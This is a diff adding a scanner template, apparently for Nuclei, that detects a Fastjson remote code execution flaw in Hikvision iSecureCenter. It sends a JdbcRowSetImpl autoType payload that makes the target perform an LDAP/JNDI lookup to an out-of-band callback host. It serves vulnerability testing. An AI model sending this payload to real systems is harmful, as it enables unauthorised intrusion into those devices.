@@ -1,0 +1,27 @@
+id: poc-hikvision-isecurecenter-fastjson-rce
+info:
+  name: Hikvision iSecureCenter Fastjson RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - /bic/ssoService/v1/applyCT
+    headers:
+      Content-Type: application/json
+    body: |
+      {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverse}}","autoCommit":true},"hfe4zyyzldp":"="}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
